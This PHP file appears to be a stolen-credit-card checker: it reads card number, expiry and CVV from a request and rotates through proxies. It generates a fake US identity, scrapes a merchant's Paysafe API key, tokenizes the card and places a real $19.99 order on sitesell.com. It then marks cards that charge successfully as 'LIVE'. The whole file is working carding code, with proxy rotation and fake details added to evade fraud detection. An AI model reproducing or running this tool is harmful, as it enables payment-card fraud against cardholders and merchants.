<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $list = file('proxy.txt');
    $proxylist = $list[rand(0, count($list) - 1)];
    $separate = explode(":", $proxylist);
    $proxy = $separate[0];
    $port = $separate[1];
    $proxyUser = $separate[2]; 
    $proxyPass = $separate[3];

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state." ", '"');
    $phone = str_replace("-", "", $data['phone']);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://secure.sitesell.com/build/order.html',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $cred = GetStr(curl_exec($ch), 'var apiKey="', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://hosted.paysafe.com/js/api/v1/tokenize',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: */*',
            'content-type: application/json',
            'Origin: https://hosted.paysafe.com',
            'Referer: https://hosted.paysafe.com/js/1.12.10/internal/index.html',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
            'X-Paysafe-Credentials: Basic '.$cred
        ),
        CURLOPT_POSTFIELDS => '{"card":{"cardNum":"'.$cc.'","cardExpiry":{"month":"'.$mm.'","year":"'.$yy.'"},"cvv":"'.$cvv.'"},"clientInfo":{"correlationId":"7167d99f-086d-4590-b2fa-5c1241e4158e","version":"1.12.10","invocationId":"92d70e31-a102-4dc6-aef0-aa183fc87507","appName":"paysafe.js"}}'
    ));
    $token = GetStr(curl_exec($ch), '"paymentToken":"','"');
    curl_close($ch);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://secure.sitesell.com/prot-bin/order-product.pl",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_POSTFIELDS => "external_experiment_id=&external_variation_id=&external_source_name=optimizely&external_analytics_details=%257B%2522ga%2522%253A%257B%257D%252C%2522optimizely%2522%253A%257B%257D%252C%2522sitesell%2522%253A%257B%2522first_visit%2522%253A%25222021-04-13%2522%252C%2522click_track%2522%253A%2522172.107.246.179.1618344037997476%2522%257D%257D&sitesell_qa=&json=1&specialOffer110=79&field1=&oneTimeToken=$token&website1=&purchase=4029&Country=United+States&First_Name=$fname&Last_Name=$lname&Address=$street&City=$city&Zip=$postcode&State=CA&Phone=$phone&Email=$fname$lname@gmail.com&Payment_Type=CC&99field=&json=1",
        CURLOPT_HTTPHEADER => [
            "accept: */*",
            "content-type: application/x-www-form-urlencoded; charset=UTF-8",
            "origin: https://secure.sitesell.com",
            "referer: https://secure.sitesell.com/build/order.html",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
      ],
    ]);
    $checkout = curl_exec($curl);
    curl_close($curl);

    $getCodes = file_get_contents('https://developer.paysafe.com/en/rest-apis/cards/test-and-go-live/card-errors/');

    $code = GetStr($checkout, '"code":"', '"');
    $respo = GetStr($getCodes, '</a>'.$code.'</td> <td>','.');

    if(strpos($checkout, 'orderSuccessful')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged $19.99</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$code.': '.$respo.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
    unlink("cookies/$cookie.txt");
?>
